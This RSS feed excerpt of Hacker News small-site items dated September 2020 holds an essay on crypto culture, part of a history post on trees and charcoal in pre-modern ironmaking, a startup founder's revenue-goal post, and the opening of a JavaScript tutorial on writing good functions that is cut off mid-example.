        <item>
            <title>
<![CDATA[Notes on Crypto Culture]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24591326">thread link</a>) | @lich-tex
<br/>
September 25, 2020 | https://dataswamp.org/~lich/musings/crypto-culture.html | <a href="https://web.archive.org/web/*/https://dataswamp.org/~lich/musings/crypto-culture.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><small><em>Fri, 25 Sep 2020 22:31:57 +0100</em></small></p>

<p>Crypto culture has gone into its adolescence. Let‚Äôs give it that. We
cannot call it mature, as nobody big on the market will consider them
seriously. Warren Buffet will never own a single Bitcoin. Just like
an average person outside the West will not own a stock. Such is the
world. Then, what is the culture of cryptographic currencies and is it
capable of not dying like a drunken teenager in a stupor?</p>

<p>This is by no way a technical article. It is one of my attempts of
trying to build an audience by writing for technical people without
selling anything. Should also write on that. If you want technical
knowledge‚Ä¶</p>

<p>I am pretty sure you have it, bud. If you don‚Äôt - do your homework.</p>



<p>It all started with Bitcoin when the hacker culture realised that
cryptographic algorithms could be used for creation of value. We still
do not know who is behind it. Anyways, discussing that is a complete
waste of time. I mean, what if it is you who made Bitcoin. You could
have spent all you had on cheese pizza or cheese pizza. That is about
how much it matters.</p>

<p>2017 happened. It was the moon. The dream of growing out of childhood
was fulfilled. Equivalent of drinking the first beer. Maybe a handjob. I
would say that a handjob is nearest in the terms of excitement to what
happened in 2017. The joy of people in the culture was on this level. Not
really a display of seriousness.</p>

<p>Adolescence is the anger at a hustler saying that a handjob is nothing.</p>

<p>Now, it was not 2012 anymore. No more articles in tech magazines
(whatever that has to do with anything). We are big now. We are serious
now. We are real now.</p>

<p>As with a handjob, one wishes to consider it part of their skill or
personal qualities. It‚Äôs never luck. It‚Äôs never accidental. It was
planned. It must have been a result of rational choices which had allowed
this. In reality, this success was a result of speculation. A tradition
as old as money. You speculate in time and in space. A derivative can
go up, down, and not change. That‚Äôs it. Nevertheless, a handjob is a
sexual encounter.</p>

<p>A mania is a value(ability) encounter.</p>



<p>2017 is over. A volatility of the biggest market is lesser. Manias are
local. Chainlink one day, something else the other. There is no general
mood of miracle now. Maybe on some forums, but far from excitement. There
are ideas for the future. Maybe becoming a real currency, everlasting
adolescence, reliving the handjob, whatever.</p>

<p>These do not resemble anything more concrete than a teenager thinking about
their future. Cause future is fucking different. Random things show up.</p>

<p>Be happy with the gigs you have. There are business that need you.
There are places where you are useful. Adolescence is not eternal.</p>

<p>Crypto is not a person, it is a technology. It can do stuff from
adolescence, but will go onward. Can it do it with such culture?</p>

<p>Culture changed once, and will change again. It might remain with certain
elements from now - the element of enthusiasm and hodling is still
there. Now it includes the awareness of 2017.</p>



<p>What will happen is <a href="https://www.youtube.com/watch?v=VjLQt0uCCfM"><em>l'avenir</em></a>. The model with which Derrida came up
for some boring interview is perfect for this case. The speculation of
possible changes can sound like excitement.</p>

<p>I can talk only about continuation of adolescence.</p>

<p>L'avenir stands for the future to come. That is the unpredictable, the
unknown. I cannot give any guarantees. Nobody can. Covid-19 taught
me that speculation is‚Ä¶ fun. I think excitement does not lead to
its dreams. No dream is going to get fulfilled. All fulfilment will
be empty.</p>

<p>Imagine the world with a particular crypto adulthood. Consider it being
a world currency. Perfectly administered by some authority. Look into
your fiat money. Somebody in the past considered it exciting. Reality
becomes the norm.</p>

<p>Fulfilment ends dreams.</p>

<p>The future reality will make crypto next technology, without culture. The
culture has to die for it to grow. No more excitement, no more surplus
enjoyment. That, I can only predict.</p>
</article></div>]]>
            </description>
            <link>https://dataswamp.org/~lich/musings/crypto-culture.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591326</guid>
            <pubDate>Fri, 25 Sep 2020 16:13:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iron, How Did They Make It? Part II]]>
            </title>
            <description>
<![CDATA[
Score 233 | Comments 66 (<a href="https://news.ycombinator.com/item?id=24591216">thread link</a>) | @parsecs
<br/>
September 25, 2020 | https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we continue our four-part (<a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">I</a>, II, III, IV) look at pre-modern iron and steel production.  Last week we prospected our iron ore and extracted it from the ground and did some initial mechanical processing (washing, sorting, crushing).  This week, we‚Äôre going to make our way from just rocks to an actual mass of <em>metal</em> rather than just some metal-bearing ore.  As we‚Äôll see, we are going to do this by applying <em>heat</em> and (more importantly) <em><strong>chemistry</strong></em>:</p>



<figure><img data-attachment-id="4618" data-permalink="https://acoup.blog/fuel-use-in-iron-production-1/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png" data-orig-size="1024,372" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fuel-use-in-iron-production-1" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png 1024w, https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/fuel-use-in-iron-production-1.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Note that this week is going to be spent <strong>just</strong> getting our iron ore into being an <strong>iron bloom</strong>, the first two steps.</figcaption></figure>



<p>Warning: Many, <em><strong>many</strong></em> trees were harmed in the making of this iron.</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>





<p>But let‚Äôs start with the <strong>single largest input</strong> for our entire process, measured in either mass or volume ‚Äì quite literally the largest input resource <em>by an order of magnitude</em>.  That‚Äôs right, it‚Äôs‚Ä¶</p>



<h2>Trees</h2>



<figure><img data-attachment-id="4597" data-permalink="https://acoup.blog/a_route_through_pine_forest/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg" data-orig-size="5184,3456" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.5&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon EOS 60D&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1402052182&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;18&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.033333333333333&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="a_route_through_pine_forest" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/a_route_through_pine_forest.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The reader may be pardoned for having gotten to this point expecting to begin with exciting furnaces, bellowing roaring flames and melting all and sundry.  <strong>The thing is, all of that energy has to come from somewhere and that somewhere is, by and large, wood</strong>.  Now it is absolutely true that there are other common fuels which were probably frequently experimented with and sometimes used, but don‚Äôt seem to have been used widely.  Manure, used as cooking and heating fuel in many areas of the world where trees were scarce, doesn‚Äôt ‚Äì to my understanding ‚Äì reach sufficient temperatures for use in iron-working.  Peat seems to have similar problems, although my understanding is it can be reduced to charcoal like wood; I haven‚Äôt seen any clear evidence this was often done, although one assumes it must have been tried.</p>



<p>Instead, the fuel I gather most people <em>assume</em> was used (to the point that it is what many video-game crafting systems set for) was coal.  The problem with coal is that it has to go through a process of <em>coking</em> in order to create a pure mass of carbon (called ‚Äòcoke‚Äô) which is suitable for use.  Without that conversion, the coal itself both does not burn hot enough, but also is apt to contain lots of sulfur, which will ruin the metal being made with it, as the iron will absorb the sulfur and produce an inferior alloy (sulfur makes the metal brittle, causing it to break rather than bend, and makes it harder to weld too).  Indeed, the reason we <em>know</em> that the Romans in Britain experimented with using local coal this way is that analysis of iron produced at Wilderspool, Cheshire during the Roman period revealed the presence of sulfur in the metal which was likely from the coal on the site.</p>



<p>We have records of early experiments with methods of coking coal in Europe beginning in the late 1500s, but the first truly successful effort was that of Abraham Darby in 1709.  Prior to that, it seems that the use of coal in iron-production in Europe was minimal (though coal might be used as a fuel for other things like cooking and home heating).  In China, development was more rapid and there is evidence that iron-working was being done with coke as early as the eleventh century.  But apart from that, by and large the fuel to create all of the heat we‚Äôre going to need is going to come from <strong>trees</strong>.</p>



<p><strong>And, as we‚Äôll see, really quite a lot of trees.  Indeed, a <em>staggering</em> number of trees, if iron production is to be done on a major scale</strong>.  The good news is we needn‚Äôt be <em>too </em>picky about what trees we use;  ancient writers go on at length about the very specific best woods for ships, spears, shields, or pikes (fir, cornel, poplar or willow, and ash respectively, for the curious), but are far less picky about fuel-woods.  Pinewood seems to have been a consistent preference, both Pliny (<em>NH</em> 33.30) and Theophrastus (<em>HP</em> 5.9.1-3) note it as the easiest to use and Buckwald (<em>op cit</em>.) notes its use in medieval Scandinavia as well.  But we are also told that chestnut and fir also work well, and we see a fair bit of birch in the archaeological record.  So we have our trees, more or less.</p>



<h2>Forests and Fellers</h2>



<p>The bad news is that while ancient sources are often <em>very</em> interested in trees (entire books about them, in fact), they are generally interested in trees used to make things like ships, buildings, furniture and weapons; essentially, elite products.  They are <em>not</em> interested in trees used as fuel.  Indeed, Latin marks this distinction, where wood for building was <em>materia</em> whereas wood for burning (but also, it seems, bulk wood being transported overseas) was <em>lignum</em>; our sources care greatly about the former and only minimally about the latter.  And so as soon as we get very far into the question of the harvesting and preparation of fuel woods, our evidence just about drops away entirely, save for a few poor mentions of this or that tree being good for charcoaling (a crucial process we‚Äôll get to in a moment).</p>



<figure><img data-attachment-id="4598" data-permalink="https://acoup.blog/1024px-transport_cedar_dur_sharrukin_louvre_ao19891/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg" data-orig-size="1024,833" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1024px-transport_cedar_dur_sharrukin_louvre_ao19891" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg 1024w, https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/1024px-transport_cedar_dur_sharrukin_louvre_ao19891.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://commons.wikimedia.org/wiki/Dur_Sharrukin#/media/File:Transport_cedar_Dur_Sharrukin_Louvre_AO19891.jpg">Via Wikipedia</a>, a detail of an Assyrian relief from the palace of Sargon II (r. 722-705) at Dur-Sharrukin, now in the Louvre, Paris, showing the transport of Lebanese cedars; in this case, clearly building timber.</figcaption></figure>



<p>Consequently, our ability to see the fellows felling the forests (say <em>that</em> five times fast) is limited.  Medieval ‚Äòforesters‚Äô are often more visible, but much like we noted last time that when Georgius Agricola says ‚Äòminer‚Äô he means ‚Äòmine owner,‚Äô my understanding is that foresters in the Middle Ages were something closer to <em>administrators</em> of the forest (responsible for letting out contracts, catching poachers, etc.; essentially a sheriff but in the woods) rather than simple tree-fellers.</p>



<p>So who did the actual tree-cutting?  I must confess, I have found relatively little evidence for the social standing of ancient tree-fellers. <strong> In quite a lot of cases, they must not have been meaningfully distinct from the local peasantry or other sources of unskilled rural labor.</strong>  Clearly a lot of woodcutting was done by the rural population that bordered the forests to clear spaces for fields, gather fuel and firewood and so on, and consequently it seems like the basic skills of tree-felling may have been relatively common. The Latin word for a wood-cutter was a <em>lignator</em> (or sometimes a <em>caesor</em>, which meant ‚Äòcutter‚Äô but could mean of wood (<em>lignorum caesores</em>) or of stone), but that word most often appears in military contexts to mean soldiers tasked with cutting wood for fuel, not full-time lumberjacks.  Evidence for the medieval period is somewhat better and also generally suggests that the local peasantry was employed in the wood-cutting itself (for this, note J. Birrell, ‚ÄúPeasant Craftsmen in the Medieval Forest‚Äù <em>Agricultural History Review</em> 17.2 (1969): 91-107).  <strong>As we will see below, often wood cut for charcoaling was cut by the colliers themselves</strong>, who we will discuss below.  It seems hard to imagine that there wasn‚Äôt some division of labor in larger operations (like on Elba or at Populonia), but how that might have been structured is not clear from the limited evidence.</p>



<p>Not all timber works were so easily acquired, of course.  While ancient wood-cutters are hard to see in the evidence, ancient sawyers and carpenters are more visible; records from building programs in Athens and Delphi suggest that skilled sawyers (seemingly always assisted by at least one unskilled worker) were paid at least as well as citizen oarsmen in the Athenian navy and in some cases rather better.  The presence of English surnames like Carpenter, Cooper, Fletcher, Bowyer, Turner, Sawyer and Wheeler speak to the fact that these were specialized crafts in medieval England; the absence of wood-<em>cutting</em> surnames further suggests that the bulk labor of felling was mostly done by the local rural workforce.  <strong>Consequently, the social status of the average timber-cutter seems to have been about the same as that of a local peasant, serf or small-farmer, because by and large these seem to have been the same people</strong>; while the work done once the tree was down and barked might be done by specialists (but is far less important for trees that are going to be charcoaled).  There were also clearly specialist timber merchants, even in the ancient world, and the degree of their visibility, especially in timber-rich regions suggests that they could do quite well for themselves (although, <a href="https://acoup.blog/2020/08/21/collections-bread-how-did-they-make-it-part-iv-markets-and-non-farmers/">like most merchants</a>, we effectively never see them penetrate into the ruling class), but again, these merchants were likely working with building timbers because, as we‚Äôll see, charcoal wood doesn‚Äôt tend to travel very far.</p>



<figure><img data-attachment-id="4600" data-permalink="https://acoup.blog/800px-transport_cedar_dur_sharrukin_louvre_ao19890/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg" data-orig-size="800,1008" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="800px-transport_cedar_dur_sharrukin_louvre_ao19890" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg?w=238" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg?w=800" src="https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg?w=800" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg 800w, https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg?w=119 119w, https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg?w=238 238w, https://acoupdotblog.files.wordpress.com/2020/09/800px-transport_cedar_dur_sharrukin_louvre_ao19890.jpg?w=768 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><a href="https://commons.wikimedia.org/wiki/Dur_Sharrukin#/media/File:Transport_cedar_Dur_Sharrukin_Louvre_AO19890.jpg">Via Wikipedia</a>, a detail of an Assyrian relief from the palace of Sargon II (r. 722-705) at Dur-Sharrukin, now in the Louvre, Paris, showing the shipment of timber, in this case likely down the Tigris to the Assyrian heartland.  High quality building timbers or ship timbers do seem to have been valuable enough to be worth shipping long distances (Athens famously imported its ship-timber from Macedon), but fuel timbers tended to come from closer to hand.  But I <strong>had</strong> this picture and I wanted to use it.</figcaption></figure>



<p><strong>The largest stock of forest-land was typically owned by the state, but private landholders owning their own forests also played a role, albeit generally a small one</strong>.  In Macedon, the king owned the forests and controlled the supply of lumber, granting or revoking the authority for communities within his territory to take advantage of woodland resources; the practice seems to have been the same, Meiggs (<em>op cit</em>.) notes, in the Near East.  In Roman Italy, a large amount of the forest-land was held by the state and contracted out for timber-cutting;<em> </em>Meiggs supposes that figures called <em>saltuarii</em> may have been responsible for making sure that ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/">https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591216</guid>
            <pubDate>Fri, 25 Sep 2020 16:02:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systems Software Research Is Irrelevant (Rob Pike, 2000) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24591106">thread link</a>) | @clockworksoul
<br/>
September 25, 2020 | http://herpolhode.com/rob/utah2000.pdf | <a href="https://web.archive.org/web/*/http://herpolhode.com/rob/utah2000.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://herpolhode.com/rob/utah2000.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591106</guid>
            <pubDate>Fri, 25 Sep 2020 15:53:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardcore Year: from 0 to $100k ARR]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24590965">thread link</a>) | @a007mr
<br/>
September 25, 2020 | https://usefocus.co/blog/hard-core-year/ | <a href="https://web.archive.org/web/*/https://usefocus.co/blog/hard-core-year/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><img src="https://0.gravatar.com/avatar/0fade99d9d6b780de315f66b5036c890?s=96" alt="Anton Cherkasov"></p><h4>Anton Cherkasov</h4>
        
        <p>Anton is a founder of Focus, which is a team management platform. He is also a writer in HackerNoon, The Startup, Good Audience, and other media. Previously Anton has worked in Wildberries (#1 eCommerce store in Russia). He is falling in love with growth hacking, product management, and football.</p>
        <hr>
        <p><strong>LATEST POSTS</strong></p><p><a href="https://usefocus.co/blog/how-to-stay-focused/">How to Stay Focused for Product Teams</a><span> 10th July, 2020</span></p><p><a href="https://usefocus.co/blog/20-hr-okr-examples/">20 Human Resources (HR) OKR Examples</a><span> 24th June, 2020</span></p>    </div><section>

				<article id="post-566">

					
	<header>
		<h2>
			<a href="https://usefocus.co/blog/category/founders-journey/">Founder's Journey</a>		</h2>
		
		<span>
			Posted 
			on <i></i> <time datetime="2020-09-15">September 15th, 2020</time>.
		</span>
	</header>


					<section>
						
<figure><img src="https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-1024x614.png" alt="Hard Core Year Focus" srcset="https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-1024x614.png 1024w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-300x180.png 300w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-768x461.png 768w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-1240x744.png 1240w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-860x516.png 860w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-680x408.png 680w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-500x300.png 500w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-400x240.png 400w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-200x120.png 200w, https://usefocus.co/blog/wp-content/uploads/2020/09/Hard-Core-Year-Focus-50x30.png 50w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I created several startups and one of them is profitable. My last one was a blockchain platform for the recruitment industry. We wanted to change recruitment and become a unicorn. It was a marketplace where we didn‚Äôt manage to acquire two types of target audiences ‚Äì companies and job seekers. It was a very challenging time. However, I decided to move forward and focus only on the B2B market.&nbsp;</p>



<p>After a long time, I decided to create a new product for team management space and now everything will be different. First, it‚Äôs an open startup. Second, I will publish our journey and share all pitfalls and challenges we overcome. That‚Äôs why it‚Äôs time for Hardcore Year.</p>



<p>Our goal is <strong>$100k ARR in 1 year</strong>. 2020 is a really unusual year and as they said crisis is the best time for the new opportunities. Let‚Äôs check it out. </p>



<h2><strong>What‚Äôs Hardcore Year?</strong></h2>



<p>Kick ass challenge to get out of the comfort zone. Hardcore Year is the public and ambitious goal with sharing all key details during the journey. You will see the main problems we solve (or not) and of course data (probably, the most interesting for you :)). I am going to publish results at the end of each month.</p>



<p>I was inspired by great entrepreneurs who have already had their Hardcore Years. Here are the few of them:</p>



<ul><li><a rel="noreferrer noopener" aria-label="Andrei Azimov (opens in a new tab)" href="https://twitter.com/AndreyAzimov/status/1134472394091814912" target="_blank">Andrei Azimov</a> (Completed)&nbsp;</li><li><a rel="noreferrer noopener" aria-label="Reilly Chaze (opens in a new tab)" href="https://rchase.com/hardcore-year/" target="_blank">Reilly Chaze</a> (Completed)&nbsp;</li><li><a rel="noreferrer noopener" aria-label="Jon Yongfook (opens in a new tab)" href="https://twitter.com/yongfook/status/1303861152603017223" target="_blank">Jon Yongfook</a>&nbsp;</li><li><a href="https://www.groovehq.com/blog/founders-journey/" target="_blank" rel="noreferrer noopener" aria-label="Alex Turnbull (opens in a new tab)">Alex Turnbull</a> from Groove (Completed)</li></ul>



<h2><strong>Why $100k ARR?</strong></h2>



<p>$100k ARR is a great milestone to validate an idea of the startup. It means ~8.3k MRR, which allows us to live and to develop the business. I want to build a profitable business that earns money without venture investments and has enough growth to make a successful company.&nbsp;</p>



<p>There is a decent amount of interesting entrepreneurs who tell their story. Groove, Andrei Azimov, Reilly Chaze, and others. They have already had great results and some of them completed their Hardcore Year. This blog might be interested for you as I start from scratch now. I will share pitfalls, mistakes, and insights I get as a founder of the early-stage startup. I will show how we make a startup in 2020.&nbsp;&nbsp;</p>



<p>Each month I publish an update with key metrics. I hope it will help others to start their journey and make something valuable for the world.&nbsp;</p>



<h2><strong>What is Focus?</strong></h2>



<p>My passion is simplifying complex things. We have a lot of different stuff every day. Different tools for work, challenges, goals, channels, news, and so on. That‚Äôs why I want to build a tool that helps companies to manage their team in a much better way than they have it now. To cut everything that is not important and focus on what really matters.</p>



<p>Focus is a team management software that helps to connect strategy with daily operations. It allows to get employees feedback and set the objectives. It‚Äôs not a usual project management tool. Because task managers don‚Äôt solve the real problem of management. They allow to do good task lists. However, many companies struggle with leadership and management. Employees don‚Äôt know how they affect the company‚Äôs goals. They even don‚Äôt know what are the main company‚Äôs goals in most cases. These issues and unskillful management directly impacts employees‚Äô happiness and engagement. According the Gallup <a href="https://www.forbes.com/sites/georgenehuang/2019/04/26/most-employees-dont-hate-their-jobs/#59aa72ed573d">survey</a>, 66% of employees are disengaged in their job. I want to fix it and make it better by giving companies the best tool to manage their teams. </p>



<h2><strong>What‚Äôs next?</strong></h2>



<p>I will publish updates at the end of a month. Subscribe to the newsletter to get the latest news about our journey. Also, connect with me on <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://twitter.com/_antoncherkasov" target="_blank">Twitter</a>&nbsp;and <a href="https://www.linkedin.com/in/anton-cherkasov/" target="_blank" rel="noreferrer noopener" aria-label="LinkedIn (opens in a new tab)">LinkedIn</a>.</p>





											</section>

					
    

					
    <div>
        <p><img src="https://0.gravatar.com/avatar/0fade99d9d6b780de315f66b5036c890?s=96" alt="Anton Cherkasov"></p><div>
            <h4>Anton Cherkasov</h4>
            <p><a href="https://usefocus.co/" target="_blank">https://usefocus.co/</a></p><p>Anton is a founder of Focus, which is a team management platform. He is also a writer in HackerNoon, The Startup, Good Audience, and other media. Previously Anton has worked in Wildberries (#1 eCommerce store in Russia). He is falling in love with growth hacking, product management, and football.</p>
            
        </div>
    </div>

					

				</article>

				
    

			</section></div>]]>
            </description>
            <link>https://usefocus.co/blog/hard-core-year/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590965</guid>
            <pubDate>Fri, 25 Sep 2020 15:41:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crafting Functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590779">thread link</a>) | @stopachka
<br/>
September 25, 2020 | https://stopa.io/post/251 | <a href="https://web.archive.org/web/*/https://stopa.io/post/251">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>We write so many functions in our programs that they become second nature before we know it. Like ants in a colony, they are numerous beyond imagination and they come together to form some surprisingly complex systems.</p><p>It begs the question: how do we write good functions? It can seem trivial: they√¢‚Ç¨‚Ñ¢re just like ants after-all. But there is leverage in the answer: the right decisions multiply throughout your codebase and bubble up into great design.</p><p>I think there are about three key ideas you can employ to craft good functions. I wanted to share them with you.</p><p>Let√¢‚Ç¨‚Ñ¢s start with an example. We have an app, and we want to export some data in a JSON format. Here√¢‚Ç¨‚Ñ¢s what a function for that could look like:</p><pre><code>function exportFile() { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const jsonStr = JSON.stringify(exportableData); // '{"data": {...
    const fileURL = saveFile("export.json", jsonStr); // https://foo.com/export.json
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Seems straight forward: To export as JSON, we first get our data. Now, this data may have some sensitive info, so we clean that up and transform into something exportable; ExportableData. Once we have that, we get a string representation, save the file, and badabing, badaboom, we√¢‚Ç¨‚Ñ¢re done. </p><p>Okay, we√¢‚Ç¨‚Ñ¢ve got something working well.</p><p>But life moves on and our program needs to evolve. Instead of just exporting JSON, we need to do more: <strong>we also need to export a CSV file</strong>. </p><p>How do we do that?</p><p>The first thing we notice, is that exporting a CSV is very similar to exporting JSON. Can we abstract <code>exportFile</code>?</p><p>One thing we can do, is to introduce a new flag: something like <code>exportFile(/*isCSV=*/ true)</code> </p><pre><code>function exportFile(isCSV) { 
  ...
  let fileURL
  if (isCSV) { 
    const csvStr = toCSVStr(exportableData)
    fileURL = saveFile("export.csv", jsonStr);
  } else { 
    const jsonStr = JSON.stringify(exportableData);
    fileURL = saveFile("export.json", jsonStr);
  }
